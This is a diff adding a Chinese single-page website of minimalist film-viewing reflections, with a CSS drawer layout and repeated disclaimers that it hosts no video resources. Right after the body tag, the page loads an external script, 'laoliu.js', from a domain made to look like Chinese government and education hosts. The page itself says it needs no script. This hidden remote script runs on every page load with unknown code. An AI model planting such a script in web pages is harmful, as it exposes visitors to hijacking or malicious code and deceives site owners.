@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>抉策映画 - 五屉取舍，只留一眼 | jueseyingshi-h5.github.io</title>
+<meta name="description" content="抉策映画(jueseyingshi-h5.github.io)是抽屉式观影取舍手记单页，挑片的眼光比片单重要，只记观感与取舍，不提供影视资源、不嵌播放源。" />
+<meta name="keywords" content="抉策映画,jueseyingshi-h5,抽屉式观影手记,取舍片单,极简导航" />
+<style>
+:root{
+  --paper:#f0ece4; --paper2:#e4ddcd; --ink:#22201d; --ink2:#4c473f; --ink3:#878072;
+  --slate:#2c3d42; --slate2:#1d2b2f; --bamboo:#c9a227; --bamboo2:#9c7d16;
+  --cinnabar:#b03a2e; --shadow:0 10px 28px rgba(34,32,29,0.13);
+  --shadow2:0 20px 48px rgba(176,58,46,0.24);
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{
+  font-family:"Songti SC","STSong","KaiTi","PingFang SC",serif;
+  background:
+    radial-gradient(circle at 22% 16%,rgba(201,162,39,0.11),transparent 46%),
+    radial-gradient(circle at 78% 86%,rgba(44,61,66,0.10),transparent 48%),
+    var(--paper);
+  color:var(--ink);line-height:1.9;overflow-x:hidden;
+}
+a{color:var(--slate);text-decoration:none;outline:none}
+img{max-width:100%;display:block}
+
+/* 竹屑 */
+.chaff{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
+.chaff i{position:absolute;width:5px;height:14px;background:var(--bamboo);opacity:.26;transform:rotate(20deg);animation:fall 15s linear infinite}
+.chaff i:nth-child(1){left:10%;top:-20px;animation-delay:0s}
+.chaff i:nth-child(2){left:30%;top:-20px;width:4px;height:10px;animation-delay:2.6s;background:var(--slate)}
+.chaff i:nth-child(3){left:56%;top:-20px;animation-delay:5.4s}
+.chaff i:nth-child(4){left:76%;top:-20px;width:6px;height:12px;animation-delay:1.4s;background:var(--bamboo2)}
+.chaff i:nth-child(5){left:92%;top:-20px;animation-delay:3.8s}
+@keyframes fall{100%{transform:translateY(110vh) rotate(220deg)}}
+
+/* 抽屉头 */
+.case-head{position:relative;z-index:10;text-align:center;padding:56px 20px 42px;background:linear-gradient(180deg,var(--paper2),var(--paper));border-bottom:6px double var(--slate)}
+.pull{width:96px;height:44px;margin:0 auto 18px;position:relative;background:var(--slate);border-radius:6px;box-shadow:var(--shadow);display:flex;align-items:center;justify-content:center}
+.pull::before{content:"";position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:52px;height:12px;border:3px solid var(--bamboo);border-radius:8px;box-shadow:inset 0 0 0 2px var(--slate)}
+.pull span{position:relative;z-index:2;font-size:22px;animation:pull 4s ease-in-out infinite}
+@keyframes pull{0%,100%{transform:translateX(-3px)}50%{transform:translateX(3px)}}
+.case-head h1{font-size:34px;font-weight:900;letter-spacing:9px;color:var(--ink)}
+.case-head h1 b{color:var(--cinnabar)}
+.note-line{margin:8px auto 0;max-width:640px;font-size:12px;color:var(--cinnabar);background:rgba(255,255,255,0.74);border:1px dashed var(--cinnabar);border-radius:8px;padding:6px 12px;font-family:"PingFang SC",sans-serif}
+.case-head p{max-width:560px;margin:10px auto 0;color:var(--ink2);font-size:15px;font-family:"PingFang SC",sans-serif}
+.nav{margin-top:22px;display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.nav a{padding:9px 20px;border:1px solid var(--slate);border-radius:2px;font-size:14px;font-weight:700;color:var(--ink);background:rgba(255,255,255,0.6);transition:.25s;font-family:"PingFang SC",sans-serif}
+.nav a:hover{background:var(--slate);border-color:var(--slate2);color:var(--paper)}
+
+.bar{position:relative;z-index:10;background:var(--slate);color:var(--paper);padding:10px 20px;font-size:13px;display:flex;gap:18px;justify-content:center;flex-wrap:wrap;font-family:"PingFang SC",sans-serif}
+.bar b{color:var(--bamboo)}
+
+.wrap{position:relative;z-index:10;max-width:860px;margin:0 auto;padding:0 18px 60px}
+.section{margin-bottom:58px;scroll-margin-top:20px}
+.sec-title{display:flex;align-items:center;gap:12px;margin-bottom:30px}
+.sec-title .key{width:34px;height:34px;background:var(--bamboo2);color:var(--paper);display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:900;border-radius:4px 4px 4px 10px;flex-shrink:0;box-shadow:inset 0 0 0 2px rgba(255,255,255,0.3);font-family:"Songti SC",serif}
+.sec-title h2{font-size:23px;font-weight:900;letter-spacing:2px;color:var(--slate)}
+.sec-title .ln{flex:1;height:1px;background:linear-gradient(90deg,var(--bamboo),transparent)}
+
+/* 抽屉组：纯 CSS :target 展开 */
+.cabinet{display:flex;flex-direction:column;gap:14px}
+.drawer{background:var(--paper);border:1px solid var(--slate);border-radius:8px;box-shadow:var(--shadow);overflow:hidden;transition:.42s}
+.drawer:target{box-shadow:var(--shadow2);border-color:var(--cinnabar);transform:translateY(-2px)}
+.handle{display:flex;align-items:center;gap:14px;padding:16px 22px;cursor:pointer;text-decoration:none;color:inherit;position:relative}
+.handle::before{content:"";position:absolute;left:8px;top:50%;transform:translateY(-50%);width:30px;height:8px;border:3px solid var(--bamboo2);border-radius:6px}
+.handle .no{font-family:"Songti SC",serif;font-size:17px;font-weight:900;color:var(--bamboo2);margin-left:34px;flex-shrink:0;width:56px}
+.handle .verdict{font-size:16px;font-weight:800;color:var(--ink);flex:1;font-family:"Songti SC",serif}
+.handle .hint{font-size:11px;color:var(--ink3);font-family:"Courier New",monospace;letter-spacing:1px;transition:.3s}
+.drawer:target .hint{color:var(--cinnabar);transform:rotate(180deg)}
+.body{max-height:0;opacity:0;padding:0 22px 0 66px;transition:max-height .42s ease,opacity .32s ease,padding .32s ease;font-family:"PingFang SC",sans-serif;color:var(--ink2);font-size:14px;line-height:1.9}
+.drawer:target .body{max-height:420px;opacity:1;padding:2px 22px 22px 66px}
+.body p{margin-bottom:8px}
+.body .tag{display:inline-block;margin-top:8px;font-size:11px;color:var(--paper);background:var(--slate);padding:3px 11px;border-radius:2px;font-family:"PingFang SC",sans-serif}
+
+/* 取舍六则：竹格盘 */
+.tray-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:16px}
+.tray{background:var(--paper);border:1px solid var(--slate);border-radius:4px 4px 14px 14px;padding:20px 14px 20px;text-align:center;transition:.26s;cursor:default;position:relative;overflow:hidden}
+.tray::before{content:"";position:absolute;top:0;left:0;right:0;height:6px;background:repeating-linear-gradient(90deg,var(--bamboo) 0 10px,transparent 10px 16px)}
+.tray .ico{font-size:24px;margin:8px 0 8px;opacity:.82}
+.tray h4{font-size:15px;font-weight:800;color:var(--slate);font-family:"Songti SC",serif}
+.tray p{font-size:12px;color:var(--ink3);margin-top:5px}
+.tray:hover{background:var(--slate);border-color:var(--slate2)}
+.tray:hover h4,.tray:hover p{color:var(--paper)}
+.tray:hover .ico{opacity:1}
+
+.about-block{background:var(--paper);border:1px solid var(--slate);border-left:8px solid var(--cinnabar);border-radius:6px;padding:26px;font-size:15px;color:var(--ink2);line-height:1.95;font-family:"PingFang SC",sans-serif}
+.about-block b{color:var(--cinnabar)}
+
+.latch{position:relative;z-index:10;background:var(--paper2);color:var(--ink);padding:12px 20px;text-align:center;font-size:13px;display:flex;gap:20px;justify-content:center;flex-wrap:wrap;font-family:"Courier New",monospace;border-top:1px dashed var(--bamboo)}
+.latch .pin{display:inline-block;width:10px;height:4px;border-radius:2px;background:var(--cinnabar);transform-origin:center;animation:latch 2.4s ease-in-out infinite}
+@keyframes latch{0%,100%{transform:rotate(-5deg)}50%{transform:rotate(5deg)}}
+
+.footer{position:relative;z-index:10;text-align:center;padding:20px 16px;color:var(--ink3);font-size:12px;border-top:6px double var(--slate);background:var(--paper2);font-family:"PingFang SC",sans-serif}
+
+@media(max-width:640px){
+  .case-header-fix{}.case-head h1{font-size:25px;letter-spacing:5px}
+  .pull{width:82px;height:38px}
+  .drawer .handle{flex-wrap:wrap;gap:10px}
+  .handle .verdict{width:100%;margin-left:34px;flex:1 0 100%;order:2}
+  .handle .hint{margin-left:auto}
+  .body{padding-left:16px!important}
+  .sec-title h2{font-size:19px}
+  .wrap{padding:0 14px 40px}
+  .tray-grid{grid-template-columns:repeat(2,1fr)}
+  .bar{gap:8px;font-size:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="chaff" aria-hidden="true"><i></i><i></i><i></i><i></i><i></i></div>
+
+<header class="case-head">
+  <div class="pull"><span>🗄️</span></div>
+  <h1><b>抉策</b>映画</h1>
+  <div class="note-line">⚠ 本页取「挑片的眼光、看片的节奏」之意，<b>是观影取舍手记，不是影视资源站</b>：不列片名索引、不嵌播放源、不提供下载/网盘/搜索/全集入口，不含任何低俗或擦边内容。</div>
+  <p>jueseyingshi-h5.github.io —— 五只抽屉，只留一眼。点开哪屉是你的，合上就不必再想。</p>
+  <nav class="nav">
+    <a href="#">柜面</a>
+    <a href="#cabinet">五屉取舍</a>
+    <a href="#tray">取舍六则</a>
+    <a href="#about">关于抉策</a>
+  </nav>
+</header>
+
+<div class="bar">
+  <span>🗄️ 性质：<b>观影手记 / 非资源站</b></span>
+  <span>🚫 无：片库 · 播放源 · 搜索 · 网盘 · 下载 · 低俗内容</span>
+  <span>✅ 只有：取舍 · 观感 · 留白</span>
+</div>
+
+<main class="wrap">
+
+  <section class="section" id="cabinet">
+    <div class="sec-title"><span class="key">屉</span><h2>五屉取舍</h2><span class="ln"></span></div>
+    <p style="max-width:660px;margin-bottom:22px;color:var(--ink2);font-size:14px;font-family:'PingFang SC',sans-serif">
+      点把手拉开一只抽屉，再看下一只会自动合上。不想看了就别点——留着比翻完干净。
+    </p>
+    <div class="cabinet">
+
+      <div class="drawer" id="d1">
+        <a class="handle" href="#d1">
+          <span class="no">壹 · 缓</span>
+          <span class="verdict">先舍得浪费半分钟雨声</span>
+          <span class="hint">拉开 ▾</span>
+        </a>
+        <div class="body">
+          <p>好片子总让声音先进门：雨打窗台、灶上水沸、远处的门轴响。人还没露脸，屋子已经坐满了。</p>
+          <p>这种开场最容易被快进掉——别急，那是导演替你铺的台阶。</p>
+          <span class="tag">缓进 · 开场</span>
+        </div>
+      </div>
+
+      <div class="drawer" id="d2">
+        <a class="handle" href="#d2">
+          <span class="no">贰 · 憋</span>
+          <span class="verdict">话压到最短，脸偏不给看</span>
+          <span class="hint">拉开 ▾</span>
+        </a>
+        <div class="body">
+          <p>只拍脚，一步一步过桥；只拍手，把杯子搁下。台词掐掉一半，剪辑替角色憋着那口气。</p>
+          <p>能忍住不解释的戏，才敢让人记很久。</p>
+          <span class="tag">紧绷 · 中段</span>
+        </div>
+      </div>
+
+      <div class="drawer" id="d3">
+        <a class="handle" href="#d3">
+          <span class="no">叁 · 淡</span>
+          <span class="verdict">被锅铲吞掉的那半句</span>
+          <span class="hint">拉开 ▾</span>
+        </a>
+        <div class="body">
+          <p>炒菜声盖住了对白，字幕也没补。反倒记住了那个节奏——有些关系就靠听不见的那半句撑着。</p>
+          <p>最家常的一场戏，往往最不敢重看。</p>
+          <span class="tag">温吞 · 日常</span>
+        </div>
+      </div>
+
+      <div class="drawer" id="d4">
+        <a class="handle" href="#d4">
+          <span class="no">肆 · 断</span>
+          <span class="verdict">雪一停，连配乐都屏住气</span>
+          <span class="hint">拉开 ▾</span>
+        </a>
+        <div class="body">
+          <p>安静到能听见自己心跳，才知道前面一直在替你绷着弦。好的转场不是转折，是突然把手松开。</p>
+          <p>这一屉别在热闹的时候打开。</p>
+          <span class="tag">悬停 · 转场</span>
+        </div>
+      </div>
+
+      <div class="drawer" id="d5">
+        <a class="handle" href="#d5">
+          <span class="no">伍 · 空</span>
+          <span class="verdict">人走了，镜头还停在空房间</span>
+          <span class="hint">拉开 ▾</span>
+        </a>
+        <div class="body">
+          <p>别快进那十秒。那是留给你自己的：你想起来的那个人，就是这屉里最淡、也最久的一眼。</p>
+          <p>合上吧，够你回味一整天了。</p>
+          <span class="tag">留白 · 收尾</span>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <section class="section" id="tray">
+    <div class="sec-title"><span class="key">则</span><h2>取舍六则</h2><span class="ln"></span></div>
+    <div class="tray-grid">
+      <div class="tray"><div class="ico">🌧️</div><h4>留声音</h4><p>开场先听，别急着看脸</p></div>
+      <div class="tray"><div class="ico">✂️</div><h4>留半句</h4><p>说破的，多半不痛</p></div>
+      <div class="tray"><div class="ico">🍲</div><h4>留灶台</h4><p>家常最难演，也最真</p></div>
+      <div class="tray"><div class="ico">🌬️</div><h4>留断处</h4><p>配乐一停，戏才进来</p></div>
+      <div class="tray"><div class="ico">🪟</div><h4>留空镜</h4><p>快进那十秒，是给你的</p></div>
+      <div class="tray"><div class="ico">🗝️</div><h4>舍得合上</h4><p>看完了不必再翻第二遍</p></div>
+    </div>
+  </section>
+
+  <section class="section" id="about">
+    <div class="sec-title"><span class="key">ℹ</span><h2>关于抉策</h2><span class="ln"></span></div>
+    <div class="about-block">
+      <p>
+        <b>抉策映画</b>（jueseyingshi-h5.github.io）是一个<b>抽屉式观影取舍手记单页</b>，「抉」是挑、是取舍，「策」是看片的节奏。
+        它<b>不是影视资源站、不是片库、不是搜索或聚合工具</b>：页面不列具体影视作品名称，不提供播放、下载、网盘、磁力、在线观看等任何指向资源的动作，
+        也不嵌入第三方播放源、不抓取外链、不做「全集 / 高清 / 最新 / 抢先看」等引导，更不含低俗、擦边或引流内容。
+        这里的五只抽屉只装「挑片的眼光」——记的是<b>怎么看、留哪些、舍哪些</b>，不是<b>去哪看</b>。
+        抽屉展开由纯 CSS `:target` 驱动，无需脚本；移动端自适应，内链以 # 占位，不生成 robots.txt / sitemap.xml，内容仅供个人交流。
+      </p>
+    </div>
+  </section>
+
+</main>
+
+<div class="latch">
+  <span><span class="pin"></span> 搭扣扣在「伍 · 空」· 暂不拉开新的</span>
+  <span>🗄️ 已开过：0 屉（这一趟）</span>
+  <span>🗝️ 状态：合上比翻完轻</span>
+</div>
+
+<footer class="footer">
+  © 2026 抉策映画（个人手记） | jueseyingshi-h5.github.io | 不列片库、不放片源、无低俗内容、不提供下载 | 内链以 # 占位
+</footer>
+
+</body>
+</html>
